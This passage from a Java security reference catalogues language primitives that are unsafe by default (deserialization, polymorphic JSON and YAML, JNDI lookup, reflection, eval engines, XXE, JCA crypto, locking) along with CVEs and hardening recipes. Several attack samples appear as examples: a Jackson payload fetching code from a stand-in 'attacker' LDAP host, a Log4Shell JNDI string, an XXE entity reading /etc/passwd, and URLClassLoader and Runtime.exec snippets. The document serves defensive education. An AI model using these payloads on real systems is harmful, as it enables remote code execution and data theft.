# Java Behavioral Footguns — Language Primitives That Are Unsafe by Default
## Synthesized from Chris Frohoff, Gabriel Lawrence, Alvaro Muñoz, Oleksandr Mirosh, Moritz Bechler, Markus Wulftange, Brian Goetz, Doug Lea, and the Trail of Bits / GitHub Security Lab Java audit corpora

> **Currency marker:** Last refreshed 2026-05-14. This expertise doc opens a new class of
> language-specific *behavioral footgun* references — primitives whose unsafe behavior is the
> default, separate from cross-language bug-class taxonomy. It is the Java instance of that class
> and should be read alongside `deserialization_expertise.md` (cross-language gadget research),
> `code_review_expertise.md` (audit methodology), and the protocol-layer docs
> (`xml_parser_differential_expertise.md`, `cryptography_expertise.md`).

> **Researchers:**
> - **Chris Frohoff** (@frohoff) — ysoserial author; AppSecCali 2015 "Marshalling Pickles"
>   (with Gabriel Lawrence); canonical Java-deserialization payload toolkit; coined Property-
>   Oriented Programming for Java. `frohoff.github.io/appseccali-marshalling-pickles/`,
>   `github.com/frohoff/ysoserial`.
> - **Gabriel Lawrence** (@gebl) — Co-presenter of AppSecCali 2015 "Marshalling Pickles";
>   co-discovered the Apache Commons Collections deserialization gadget that became the
>   foundational Java RCE primitive of the post-2015 era.
> - **Alvaro Muñoz** (@pwntester) — Principal Security Researcher, GitHub Security Lab; co-author
>   of Black Hat 2016 "Journey from JNDI/LDAP Manipulation to RCE Dream Land" and Black Hat USA
>   2017 "Friday the 13th: JSON Attacks" (both with Mirosh, authored at HPE Fortify); Text4Shell
>   discoverer; CodeQL-based taint analysis at scale.
> - **Oleksandr Mirosh** — HPE / Micro Focus Fortify Software Security Research; co-author of
>   the JNDI injection formalization and the polymorphic-JSON gadget catalog with Muñoz; the
>   body of knowledge that Log4Shell later weaponized at internet scale.
> - **Moritz Bechler** (@mbechler) — SySS GmbH; author of "Java Unmarshaller Security" (2017)
>   + the `marshalsec` tool demonstrating the deserialization-gadget class is universal across
>   Java marshallers, not specific to `ObjectInputStream`; contributed the C3P0 gadget to
>   ysoserial. `github.com/mbechler/marshalsec`.
> - **Markus Wulftange** — Principal Security Researcher, CODE WHITE GmbH; RichFaces EL bypass,
>   AMF3 protocol exploitation, SAP J2EE Engine deserialization, JMX RCE technique, Symantec
>   Endpoint Protection vulnerability disclosures. `codewhitesec.blogspot.com`.
> - **Brian Goetz** — Java Language Architect at Oracle; spec lead for JSR-335 (Lambda) and the
>   modern Java evolution path (records, sealed classes, pattern matching, virtual threads);
>   author of *Java Concurrency in Practice* (2006).
> - **Doug Lea** — SUNY Oswego; spec lead for JSR-166 (`java.util.concurrent`); JMM
>   contributions underpin every modern Java concurrency primitive. `gee.cs.oswego.edu/dl/`.
> - **Trail of Bits Java audit corpus** — institutional Java review tradition (Temurin audit
>   with OSTIF + Eclipse Foundation; Eclipse JKube audit; published Semgrep ruleset).
>   `github.com/trailofbits/publications`.
> - **GitHub Security Lab Java team** — Muñoz et al.; CodeQL Java query packs; Text4Shell
>   discovery; ongoing gadget-class research published to GHSA. `securitylab.github.com`.
>
> **Cross-links to neighboring expertise docs:**
> - `deserialization_expertise.md` — Java/Jackson/SnakeYAML deserialization deep dive
> - `code_review_expertise.md` — manual audit methodology that applies on top of these primitives
> - `semgrep_rule_authoring.md` — rule design for detecting these patterns at scale
> - `cryptography_expertise.md` — JCA primitives and their safe-default deficits
> - `xml_parser_differential_expertise.md` — XXE and parser-differential surface in Java
> - `template_code_injection_expertise.md` — SpEL / OGNL / MVEL / JEXL eval primitives
> - `race_conditions_concurrency_expertise.md` — JMM, happens-before, and concurrency surface
> - `distributed_authz_expertise.md` — Spring Security / actuator authorization gaps
> - `shell_injection_expertise.md` — process-spawn primitives and argv injection
> - `cicd_supply_chain_expertise.md` — `META-INF/services` SPI hijack and JAR-supply-chain surface

---

## 1. The Behavioral-Footgun Framing

### Why "footgun" is the right primitive of analysis

A *cross-language bug class* (deserialization, XXE, command injection, SSRF) is defined by
attacker control over a particular semantic operation. A *behavioral footgun* is the inverse: a
language-internal primitive whose default behavior is unsafe regardless of attacker control.
The two views overlap but are not equivalent. `pickle.loads(untrusted)` is a deserialization
bug class. `ObjectInputStream.readObject()` is *both* a deserialization sink AND a Java
behavioral footgun, because the language ships the primitive with code-execution semantics
enabled by default.

The footgun lens forces the question: **what does the language guarantee by default, and what
does it require the developer to opt into?** When the language defaults to unsafe behavior,
every codebase begins with the unsafe property; the burden of "did the developer remember to
opt out" is permanent. When the language defaults to safe behavior, the burden inverts: the
developer must opt *in* to the unsafe primitive, which produces a visible review point.

Java was designed in 1995 with a "secure by design" claim plausible for the desktop applet
threat model. But the language and standard library were not designed for the *server-side
untrusted-data* threat model that dominated post-2005. Many primitives safe in the applet era
— `Class.forName()`, `ObjectInputStream`, JNDI lookup, Java Serialization, default XML/Cipher
behavior — became footguns when the threat model shifted to "an HTTP endpoint receives bytes
that the JVM then interprets as code or type information." The result: any sufficiently rich
classpath contains gadget chains; any default-configured XML parser is XXE; any
`ObjectInputStream` without `ObjectInputFilter` is RCE; any `Cipher.getInstance("AES")` is ECB.

### The "JVM is hostile by composition" frame

When you ship a Java service, you ship that codebase plus every transitive dependency plus
every JDK-internal class those dependencies expose. The attacker does not need a bug in *your*
code; they need an exploitable interaction between *your* unsafe-default primitive (the sink)
and *any* class on the transitive classpath (the gadget). Apache Commons Collections did not
contain a bug — `Transformer` was correct for data-transformation pipelines. The footgun was
that `ObjectInputStream.readObject()` could reach `Transformer.transform()` through a
serialized object graph, and the deserializing-service developer had no visibility into the
classpath-wide consequence. ysoserial's payload directory has grown from 5 (2015) to 30+
(2026), each one a gadget chain in some popular library. The classpath surface is unbounded;
the sink surface is small. **Eliminate the sink, not the gadgets.**

### Scope

This doc covers Java primitives whose default behavior is unsafe in the server-side
untrusted-data threat model, organized in 15 numbered sections. It does *not* duplicate cross-
language bug-class coverage (`deserialization_expertise.md`), protocol-layer issues (XXE
methodology, HTTP smuggling), or rule-authoring methodology (`semgrep_rule_authoring.md`).
Selection criterion: *if you handed this primitive to a developer with no prior security
context, what is the probability they would deploy it in an unsafe configuration?* Anything
above ~50% qualified.

---

## 2. Java Serialization (`Serializable` / `Externalizable`)

### The primitive

`java.io.ObjectInputStream.readObject()` reconstructs an arbitrary object graph from binary
wire format (magic `0xACED 0x0005`). Reconstruction: (1) resolves classes via the
deserializing JVM's class loader; (2) instantiates each object **without calling its
constructor** (internal `newInstance` bypass); (3) restores fields; (4) calls `readObject()`
on classes implementing it — *before* application code sees the object; (5) calls
`readResolve()` if implemented; (6) calls `validateObject()` on registered validators; (7)
eventually calls `finalize()` on GC. Every hook is an attacker-controlled callback. The
application does not need to do anything with the returned object for code execution; parsing
the stream is sufficient.

### Why Java Serialization is unfixable

The Frohoff-Lawrence AppSecCali 2015 talk demonstrated this is not a "patch the library"
problem. ysoserial's README: "the vulnerability lies in the application performing unsafe
deserialization and NOT in having gadgets on the classpath." Each gadget-library patch (Apache
Commons Collections, Spring, Hibernate, Apache CXF, Groovy, ROME, Click, Vaadin, Wicket,
JSON-IO, BeanUtils, BeanShell, JBoss, C3P0) only removed one weapon; ysoserial currently lists
30+ payloads. Cross-link `deserialization_expertise.md` §2 for the gadget catalog. The
architectural fix is removing the sink: do not call `ObjectInputStream.readObject()` on
attacker-controllable bytes.

### `serialVersionUID` and the false sense of security

`serialVersionUID` is a compatibility marker, not a security control. An attacker sending a
serialized payload specifies the UID in the stream and matches the target's class definition
trivially. The actual security control is `ObjectInputFilter` (JEP 290) or removing the
deserialization entry point.

### Magic methods

Java Serialization invokes these by reflection during stream parse:

- **`readObject(ObjectInputStream)`** — called before the object is handed to application code.
  Canonical gadget entry point.
- **`readObjectNoData()`** — called if no data is present for this class in the stream.
- **`readResolve()`** — substitutes a different object instance after reading. The substitute
  can itself trigger gadget logic.
- **`writeReplace()`** — write-time symmetric. Not reachable from inbound payloads but pivotable
  on services that emit attacker-influenced data.
- **`finalize()`** — GC-invoked. Produces the "we threw the object away but it still RCE'd us
  30 seconds later" failure mode.

Once `readObject()` is reached, the gadget has executed. Application-layer exception-catching
is too late.

### JEP 290 / `ObjectInputFilter` (JDK 9+)

JEP 290 introduced a serialization filter intercepting class-resolution and array-allocation
events during stream parsing (REJECTED / ALLOWED / UNDECIDED). The pattern syntax is
semicolon-separated:

```
maxdepth=100;maxbytes=10000000;com.myorg.SafeClass;!*
```

The trailing `!*` is the allowlist closer — without it the filter is a blacklist. JEP 290 is
opt-in per-stream or process-wide via `jdk.serialFilter`. JDK applies it by default to RMI
registries (closing `ysoserial.RMIRegistryExploit`). JEP 415 (JDK 17) added context-specific
filters.

Limits: (1) **one-direction** — Bechler / An Trinh (2019) showed RMI client-side
deserialization of responses isn't filtered; force the target into client role to bypass.
(2) **bean-property marshallers unaffected** — SnakeYAML, Jackson default typing, XStream
don't go through `ObjectInputStream`. (3) **opt-in** — default-configured `ObjectInputStream`
has no filter. (4) **subtle syntax** — `!*` discipline matters. JDK 17 strict mode
(`jdk.serialFilterFactory`) tightens defaults but cannot retrofit every legacy call.

### Real CVE corpus (selected)

CVE-2015-7501 (Commons Collections), CVE-2015-4852 (JBoss AS), CVE-2016-1000027 (Spring
HttpInvokerServiceExporter), CVE-2017-12149 (JBoss ReadOnlyAccessFilter), CVE-2017-9805
(Struts2 REST plugin / XStream), CVE-2019-2725 + CVE-2020-2883 (Oracle WebLogic),
CVE-2021-44228 (Log4Shell — §4), CVE-2022-1471 (SnakeYAML — §3), CVE-2022-22963 (Spring Cloud
SpEL — §6), CVE-2022-22965 (Spring4Shell — §10), CVE-2023-46604 (ActiveMQ OpenWire),
CVE-2024-53677 (Struts2 OGNL). Sources: `nvd.nist.gov`, `github.com/frohoff/ysoserial`,
`github.com/advisories/GHSA-fjq5-5j5f-mvxh`.

---

## 3. Jackson / Gson / Fastjson Polymorphic Deserialization

### The polymorphic-type primitive

Jackson's `@JsonTypeInfo(use = Id.CLASS)` tells the JSON deserializer to read a fully-qualified
Java class name from the JSON document and instantiate that class. Intended for OO polymorphism;
the footgun is that the class name is attacker-controlled and pre-2.10 Jackson did no type-
relatedness check. Muñoz + Mirosh's "Friday the 13th: JSON Attacks" (2017) showed this is the
same vulnerability class as Java Serialization with a different wire format. The canonical
JDK-only gadget is `com.sun.rowset.JdbcRowSetImpl`:

```json
{"@class":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```

Jackson sets `dataSourceName` via the bean setter, then `autoCommit=true`, which calls
`getConnection()` → JNDI lookup on the attacker URL → class fetch + instantiation. RCE in
three setter calls, no external gadget library.

### `enableDefaultTyping` and the 2.10 hardening

Pre-2.10, `ObjectMapper.enableDefaultTyping()` was the bulk opt-in. Post-2.10, that method is
deprecated; recommended path:

```java
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.myorg.").build();
mapper.activateDefaultTyping(ptv, DefaultTyping.NON_FINAL);
```

The validator is a mandatory allowlist gate. Caveats: legacy codebases still use the
deprecated method (removing is a behavior change); `@JsonTypeInfo` on individual fields is
independent of `enableDefaultTyping`; `allowIfSubType(Object.class)` reproduces the original
footgun. Source: `cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018f0ce2ba`.

### Fastjson autotype + `@type`

Fastjson (Alibaba) was the most-exploited Java JSON library in 2017-2022. The `@type` key in
incoming JSON specified the class to instantiate, with no allowlist. Defensive evolution shows
the blacklist pattern in real time: `AutoTypeCheckHandler` was added; researchers bypassed it
(leading slashes, MessageDigest abuse, encoding). Fastjson 1.2.83 enabled `safeMode` which
disables `autoType` entirely; Fastjson 2.x rebuilt around allowlist-by-default. CVE-2022-25845
documents the 1.2.83 escape; CVE-2017-18349 is the original autotype RCE. Same lesson as
Jackson: blacklists are permanently broken.

### Gson — safer by default, with caveats

Gson does not support polymorphic deserialization via class-name-in-JSON by default. Type
information is required at the call site (`Gson.fromJson(json, Dog.class)`); the parser will
not instantiate any class other than the one passed. Caveats:
`RuntimeTypeAdapterFactory` re-introduces polymorphism with a developer-provided type-map
(allowlist-by-construction; safe when used correctly); custom `TypeAdapter`s that call
reflection can re-introduce the gadget surface; Gson 2.9.0 added `ReflectionAccessFilter` for
JDK-internal-class hardening.

### SnakeYAML and CVE-2022-1471

SnakeYAML's `Constructor` class (the default constructor, not `SafeConstructor`) supported
arbitrary type instantiation via the YAML `!!` tag syntax. Per the CVE-2022-1471 advisory:
**"SnakeYaml's Constructor() class does not restrict types which can be instantiated during
deserialization."** The fix in SnakeYAML 2.0 was to make `Constructor` inherit from
`SafeConstructor`, flipping the default from unsafe to safe.

Pre-2.0:
```java
Yaml yaml = new Yaml();                        // unsafe — supports !!arbitrary.Class
Object o = yaml.load(untrustedYaml);
```

Post-2.0 or with explicit safety:
```java
Yaml yaml = new Yaml(new SafeConstructor());   // safe — no arbitrary type instantiation
```

The `!!javax.script.ScriptEngineManager` payload from Bechler's marshalsec corpus (§3 of
`deserialization_expertise.md`) was the canonical exploit. SnakeYAML downstream consumers —
Spring Boot config parsing, Apache Camel, ESAPI, Apache Brooklyn, JBoss Resteasy — all needed
the fix propagated.

Sources: `snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/`,
`github.com/advisories/GHSA-mjmj-j48q-9wg2`,
`veracode.com/blog/resolving-cve-2022-1471-snakeyaml-20-release-0/`.

### Cross-link

For the full Java deserialization gadget catalog (CommonsCollections, TemplatesImpl, URLDNS,
JRMPClient/JRMPListener, C3P0 bridging), see `deserialization_expertise.md` §2-§3. This section
focused on the JSON/YAML *primitives* — the bean-property setters and `@JsonTypeInfo` /
`@type` / `!!` syntax that are footguns even before the gadget question.

---

## 4. JNDI + LDAP / RMI Lookup

### The primitive

`javax.naming.Context.lookup(String name)` performs a Java Naming and Directory Interface
lookup. If the name is a URL (`ldap://`, `rmi://`, `iiop://`, `dns://`), JNDI dispatches to the
appropriate provider, fetches the referenced object, and *instantiates it on the local JVM*.

The instantiation is what makes this a footgun. JNDI references can include a `javaCodeBase`
attribute (a URL) and a `javaFactory` attribute (a class name). Pre-patch JVMs would:

1. Receive an LDAP/RMI response containing a `Reference` object.
2. Read `javaCodeBase` (an attacker-controlled URL).
3. Fetch a JAR from that URL.
4. Load and instantiate the `javaFactory` class from that JAR.

This is `URLClassLoader.newInstance` driven by a single `lookup()` call. The Muñoz + Mirosh
Black Hat 2016 "Journey from JNDI/LDAP Manipulation to Remote Code Execution" formalized this
attack class.

### Patch evolution

Oracle's response was incremental: Java 8u121 (Jan 2017) restricted RMI codebase loading by
default (`java.rmi.server.useCodebaseOnly=true`); Java 8u191 (Oct 2018, CVE-2018-3149)
restricted LDAP codebase loading (`com.sun.jndi.ldap.object.trustURLCodebase=false`). Both are
*defaults*, not enforced policy.

The attack class survived. Bechler identified post-patch gadgets without remote codebase
loading: `org.apache.naming.factory.BeanFactory` (Tomcat) takes a `forceString` attribute and
an EL-template attribute; looking up a Reference with these triggers EL evaluation, invoking
`Runtime.exec()`. Tomcat-on-classpath is sufficient. The lesson: the codebase-loading patch
fixed one path; JNDI lookup of attacker-controlled URLs is still dangerous.

### Log4Shell (CVE-2021-44228) — the JNDI footgun at scale

Log4j2's "message lookup substitution" interpreted `${...}` patterns in log messages including
`${jndi:ldap://attacker/path}`. Any attacker who could cause a user-controlled string to be
logged could trigger a JNDI lookup. The catastrophe of Log4Shell was not the JNDI primitive —
Muñoz/Mirosh had established the danger in 2016 — but the *amplifier*: a logging library
universally deployed across Java services, with JNDI dispatch enabled by default. Mitigation
evolution: Log4j 2.15 removed default message-lookup substitution (bypassable); 2.16 removed
the JNDI lookup entirely; 2.17 fixed CVE-2021-45105 DoS; `JndiLookup` class removal was the
workaround for environments that couldn't upgrade.

### `Reference` server gadget surface

The attacker-side LDAP/RMI server delivering JNDI References is a documented research artifact
(`marshalsec.jndi.LDAPRefServer` is canonical). The defense: never call `Context.lookup` /
`InitialContext.lookup` with an attacker-controlled argument. Any `lookup()` of a name from
request data, message content, or untrusted configuration is potentially the same
vulnerability class as Log4Shell.

---

## 5. Dynamic Class Loading and Reflection

### `Class.forName(String)` and `ClassLoader.loadClass`

`Class.forName("com.example.Foo")` resolves a class name string at runtime. The default 1-arg
form *invokes the class's static initializer* on resolution. This is a code-execution
primitive when the class name is attacker-controlled:

```java
Class.forName(request.getParameter("class"));  // static initializer executes
```

The 3-arg variant `Class.forName(name, initialize, loader)` with `initialize=false` skips the
initializer, but the default 1-arg form runs it. The attacker only needs to find any class
with a security-relevant static block. This is also the lookup mechanism every dynamic
instantiation path uses internally — frameworks reading a class name from configuration are
reachable when the configuration is attacker-influenced.

### `Method.invoke()` and `Field.setAccessible(true)`

`Method.invoke(target, args)` calls a method by reflection. When the `Method` itself is
acquired from `Class.forName(name).getDeclaredMethod(methodName, ...)` with attacker-
controlled `name` / `methodName`, the result is "arbitrary method on arbitrary class with
attacker-supplied args" — the underlying mechanism `InvokerTransformer` exposes as the gadget
primitive.

`Field.setAccessible(true)` is the access-control bypass primitive. JEP 396 (JDK 16) introduced
strong encapsulation of internal JDK packages, causing `setAccessible(true)` on JDK-internal
fields to throw `InaccessibleObjectException` by default. Runtime overrides (`--add-opens
java.base/java.util=ALL-UNNAMED`) re-enable the behavior; ysoserial requires these on JDK 16+
when *generating* payloads. The target JVM at deserialization doesn't need the override
because `ObjectInputStream` uses an internal allocator that bypasses the access check.

### `ClassLoader.defineClass(byte[])` — bytecode injection

`ClassLoader.defineClass(name, byte[], offset, length)` defines a new class from raw bytecode
in the receiving JVM. This is the inner mechanism of the `TemplatesImpl` gadget: the
serialized `TemplatesImpl` object carries a `_bytecodes` field; when `getOutputProperties()`
is called on the deserialized instance, the JDK loads that bytecode via `defineClass`. The
attacker chooses arbitrary bytecode — a class that calls `Runtime.exec()` in its constructor.
This is the canonical terminal primitive for post-2015 gadget chains (`CommonsCollections2`,
`CommonsBeanutils1`, `Click1`, `Vaadin1`, `ROME`, `JSON1`).

### `URLClassLoader` from untrusted URL

```java
URLClassLoader loader = new URLClassLoader(new URL[] { new URL(userInput) });
Class<?> c = loader.loadClass("com.evil.Pwn");
c.newInstance();
```

This fetches a JAR from the attacker URL, loads classes from it, and instantiates them. The
SnakeYAML `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [...]]` chain abuses
exactly this primitive without any explicit `URLClassLoader` call in application code.

Any user-controlled URL passed to `URLClassLoader` is a JAR-supply-chain compromise primitive.

### `sun.misc.Unsafe`

`sun.misc.Unsafe` is the JDK-internal escape hatch for memory-unsafe operations
(`allocateMemory`, `putByte`, `getObject`). It's used by `java.util.concurrent`,
`AtomicReference`, `LockSupport`, and most other low-level concurrency primitives.

For security purposes, `Unsafe` is interesting because:

1. It can bypass type safety: `putObject(target, fieldOffset, attacker)` writes arbitrary
   references into private fields without invoking `setAccessible`. This bypasses the JPMS
   encapsulation that broke `setAccessible`-based gadgets in JDK 16+.
2. It can read/write off-heap memory, which can corrupt JVM internals if misused.
3. It can allocate objects without invoking constructors (`allocateInstance`) — the same
   primitive Java Serialization uses internally.

JEP 471 (JDK 23, 2024) deprecated the memory-access methods of `sun.misc.Unsafe` for removal,
with a phased timeline: compile-time warnings (23), runtime warnings (25 or earlier), runtime
exceptions (26+), removal (subsequent releases). Replacements: VarHandle API (JEP 193, JDK 9)
for object-field access; Foreign Function & Memory API (JEP 454, JDK 22) for off-heap memory.

Source: `openjdk.org/jeps/471`, `foojay.io/today/unsafe-is-finally-going-away-embracing-safer-memory-access-with-jep-471/`.

### `ServiceLoader` and `META-INF/services` supply chain

`java.util.ServiceLoader.load(ScriptEngineFactory.class)` walks the classpath, reads every
`META-INF/services/javax.script.ScriptEngineFactory` resource, and instantiates each declared
implementation class. The instantiation is implicit — calling `ServiceLoader.load` plus any
iteration is enough to trigger constructors of every declared service implementation.

This is the supply-chain footgun: a malicious JAR on the classpath that declares a service
implementation for a commonly-iterated SPI (script engines, XML factories, security providers,
cryptographic providers) gets its constructor called the first time the host application
iterates that SPI.

The exploitation pattern was used in the SnakeYAML `URLClassLoader → ScriptEngineManager`
chain: the attacker's JAR (fetched via URLClassLoader from the YAML) declares a fake
`ScriptEngineFactory`, and the subsequent `new ScriptEngineManager(loader)` triggers
`ServiceLoader.load(...)`, which constructs the fake factory, which runs the attacker's code.

Cross-link to `cicd_supply_chain_expertise.md` for the broader JAR-supply-chain context.

### Java Security Manager deprecation

`SecurityManager` was Java's runtime-permissions framework for sandboxing untrusted code. It
was the foundation of the applet sandbox. JEP 411 (JDK 17, 2021) deprecated it for removal;
JEP 486 (JDK 24, 2025) permanently disabled it. JDK 25 documentation states: "The Security
Manager Is Permanently Disabled." The API remains for compatibility but has no operational
effect.

The implication for behavioral footgun analysis: the JVM no longer offers an in-process
mitigation for any of the primitives in this doc. There is no `SecurityManager.checkPermission`
gate that an application can install to block `ObjectInputStream.readObject`, `Class.forName`,
`URLClassLoader`, or `Runtime.exec`. The "deny by policy" path is gone. Defensive coding must
prevent the unsafe operation at the source rather than rely on a runtime policy check.

Source: `openjdk.org/jeps/411`, `openjdk.org/jeps/486`,
`docs.oracle.com/en/java/javase/25/security/security-manager-is-permanently-disabled.html`.

### Real CVE corpus

- **CVE-2015-7501** Apache Commons Collections — `InvokerTransformer` is the reflection gadget
- **CVE-2017-9805** Apache Struts2 REST plugin XStream — reflection-driven instantiation
- **CVE-2019-17564** Apache Dubbo Hessian2 — `Class.forName` on attacker-controlled name
- **CVE-2021-44228** Log4j2 JNDI — `Context.lookup` reaches `Class.forName` through
  `Reference.getFactoryClassName()`
- **CVE-2022-22965** Spring4Shell — `class.module.classLoader` data binding (see §10)

---

## 6. ScriptEngine / Nashorn / GraalVM JS / SpEL / OGNL / MVEL / JEXL

### The eval primitive

```java
ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");
engine.eval(request.getParameter("expression"));
```

`ScriptEngine.eval(String)` parses and executes JavaScript (or any other JSR-223 scripting
language) in the host JVM with full access to Java classes. Nashorn defaults expose all of
`java.*`; an `eval` of `Java.type("java.lang.Runtime").getRuntime().exec("...")` produces RCE.

Nashorn was the JDK 8 default JavaScript engine. JEP 372 removed it from the JDK in version
15 (2020). The replacement is GraalVM JavaScript, which can be added as a dependency
(`org.graalvm.js:js`) and exposed via the same `ScriptEngineManager` API. The footgun is
identical: `eval(attackerString)` from GraalVM JS is RCE just like Nashorn.

GraalVM JS adds a `polyglot` mode with stricter sandboxing controls. Configured correctly,
it can restrict Java interop. But "configured correctly" is opt-in; the default exposes
`Java.type` and full reflection.

### Spring Expression Language (SpEL)

SpEL is Spring's expression language: `@Value("#{...}")`, `@PreAuthorize("#{...}")`, dynamic
property resolution, MVC view templates. SpEL has access to
`T(java.lang.Runtime).getRuntime().exec(...)` for arbitrary static-method invocation —
attacker-controlled SpEL is RCE. Hardening: `SimpleEvaluationContext` (instead of
`StandardEvaluationContext`) disables type references and constructor invocation. Spring
Security method-security defaults use `SimpleEvaluationContext` post-2018; legacy
`StandardEvaluationContext` uses remain. CVE-2022-22963 (Spring Cloud Function) shipped
`StandardEvaluationContext` on the routing-expression header path; fix added a separate
`headerEvalContext` based on `SimpleEvaluationContext`. Source: `spring.io/security/cve-2022-22963/`.

### OGNL, MVEL, JEXL, EL

OGNL (Struts2 ValueStack) has produced 8+ critical RCEs: CVE-2010-1870, CVE-2017-5638
(Equifax), CVE-2018-11776, CVE-2020-17530, CVE-2024-53677 (file-upload mass-assignment).
Struts 7.0.0+ removes the legacy parameter-name OGNL evaluation entirely.

MVEL (Drools, jBPM, KIE-Server): CVE-2021-26117 (Apache ActiveMQ ServerInfo).
JEXL (Apache Commons Configuration): CVE-2021-44832 was the Log4j2 follow-up via JDBC Appender
config injection.
EL (JSP/JSF/Jakarta Faces, JSR-341): `${...}` in JSF templates evaluates EL; Tomcat
`BeanFactory` JNDI gadget (§4) abuses Tomcat's EL evaluator.

For the cross-language eval-engine taxonomy, see `template_code_injection_expertise.md`.

### Defensive pattern: never `eval(userString)`

The defense is simple in principle and culturally hard in practice: do not pass user input to
any `eval`-equivalent surface. SpEL, OGNL, MVEL, JEXL, ScriptEngine — none of these have a
"safe mode" that survives untrusted input. `SimpleEvaluationContext` for SpEL is the closest
to a safe mode, but its safety depends on the developer remembering to use it everywhere
attacker-controlled strings are evaluated.

Code review pattern: grep for `eval(`, `parseExpression(`, `ExpressionParser`, `OgnlUtil`,
`MVEL.eval(`, `JexlEngine`, `ScriptEngine`. For each call site, trace the argument back to its
source. Any path from request data to one of these calls is a CVE candidate.

---

## 7. XXE in Standard Parsers

### The defaults

Java's `javax.xml.parsers.DocumentBuilderFactory` and related XML factory classes
(`SAXParserFactory`, `XMLInputFactory`, `TransformerFactory`, `Validator`, `SchemaFactory`)
historically defaulted to processing external entities. An XML document with:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

would have `&xxe;` expanded to the file contents during parse. Beyond local file disclosure,
SSRF (via `http://` system identifiers), DoS (billion laughs, quadratic blowup), and out-of-
band exfiltration (parameter entities + external DTDs) are all available from the same
primitive.

### Disabling DTDs — the OWASP recipe

OWASP XXE Prevention Cheat Sheet canonical fix:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

`disallow-doctype-decl=true` is the strongest single defense. None of these settings are on by
default. Every Java codebase constructing `DocumentBuilderFactory.newInstance()` and skipping
the hardening block is XXE-vulnerable. Code-review: grep for `*.newInstance` on
DocumentBuilderFactory / SAXParserFactory / XMLInputFactory and verify the hardening block
follows.

### XInclude and `XMLDecoder`

Even with DTDs disabled, `XIncludeAware(true)` permits `<xi:include href="..."/>` directives
that dispatch HTTP/file fetches with XXE-equivalent blast radius. OWASP recipe explicitly sets
`setXIncludeAware(false)`.

`java.beans.XMLDecoder` is a different primitive: *not* an XML parser but a Java-object
serializer using XML as wire format. `XMLDecoder.readObject()` parses `<object>`, `<method>`,
`<void>` tags and reflectively invokes constructors and methods — RCE on any attacker-
controlled XML. Subject of multiple WebLogic CVEs (CVE-2017-3506 / CVE-2017-10271). Cross-link
`deserialization_expertise.md` §2.

### Cross-link

For full parser-differential analysis (how parser-by-parser entity handling produces
exploitable differentials), see `xml_parser_differential_expertise.md`.

Source: `cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html`,
`semgrep.dev/docs/cheat-sheets/java-xxe`.

---

## 8. Java Cryptography Architecture Pitfalls

### `Cipher.getInstance("AES")` — ECB by default

`Cipher.getInstance("AES")` is incomplete — it specifies algorithm but not mode or padding.
JCA: "Implementations may default to a specific mode and padding when the transformation is
incomplete." Oracle's SunJCE defaults to `AES/ECB/PKCS5Padding`. ECB is unsafe for any data
with structural regularities (the canonical Tux-image demonstration). Defense: always specify
the full transformation (`AES/GCM/NoPadding`, `AES/CBC/PKCS5Padding` with explicit IV).
Better: use a high-level API like Tink or Bouncy Castle's `AEADBlockCipher`.

### `Random` vs `SecureRandom`

`java.util.Random` is a linear-congruential PRNG with recoverable seed.
`java.security.SecureRandom` is a cryptographic PRNG seeded from OS entropy. Near-identical
APIs is why `Random` ends up where it shouldn't. Code-review: grep for `new Random(` /
`Math.random(` in security-sensitive code (tokens, session IDs, nonces, CSRF, password resets).

### `SecureRandom` with explicit seeding

`SecureRandom.setSeed(long)` *supplements* the default seed on most platforms but
*replaces* it on some early Java implementations. `setSeed(currentTimeMillis())` is
catastrophic. Defensive pattern: never call `setSeed` — the no-arg constructor seeds from OS
entropy. For applications needing the strongest available algorithm, use
`SecureRandom.getInstanceStrong()` (blocks on Linux with `/dev/random` strict mode; check
platform tradeoff).

### `MessageDigest` — MD5 / SHA-1

MD5 and SHA-1 are cryptographically broken (chosen-prefix collisions at consumer-GPU cost).
Footgun: the same primitive is sometimes a CVE (signature verification, credential
deduplication, file integrity) and sometimes fine (cache keys, log identifiers). Discriminator:
what trust does the code attach to the output? Use SHA-256+ for security purposes.

### Key size and algorithm choice

`KeyPairGenerator.getInstance("RSA").initialize(1024)` compiles and runs but produces a CVE-
class key (NIST deprecated 1024-bit RSA in 2013). RSA 2048 minimum, 3072+ recommended; better,
use Ed25519 or ECDSA P-256+ for new signature schemes. HMAC: prefer `HmacSHA256` over
`HmacSHA1` (technically OK but deprecated style); `HmacMD5` is safe under HMAC construction
but is poor signal in code review.

### `KeyStore` defaults

`KeyStore.getInstance("JKS")` is the legacy format with weak password-based encryption.
`KeyStore.getInstance("PKCS12")` is the current recommendation (JDK 9+ default via
`getDefaultType()`). Legacy JKS keystores should be migrated.

### Cross-link

For TLS configuration, certificate validation, KDF choice, post-quantum migration, see
`cryptography_expertise.md` and `post_quantum_cryptography_expertise.md`.

---

## 9. Concurrency Footguns

### `synchronized(this)` — the lock-on-this anti-pattern

`synchronized(this)` exposes the lock as public surface. Any code holding a reference can
`synchronized(instance) { ... }` and acquire the same lock — unintended cross-class
contention, exploitable as a DoS vector with attacker-influenced contending code (uploaded
plugins, third-party listeners). Goetz's *JCiP* §2.4 recommends private final lock objects:

```java
private final Object lock = new Object();
public void process() { synchronized (lock) { ... } }
```

Same anti-pattern: `public synchronized void m()` (equivalent to `synchronized(this)`),
`synchronized(MyClass.class)` (exposes the class object).

### `HashMap` is not thread-safe

`java.util.HashMap` produces undefined behavior under concurrent access — including infinite
loops in pre-JDK-8 implementations during raced linked-list resize. Fix:
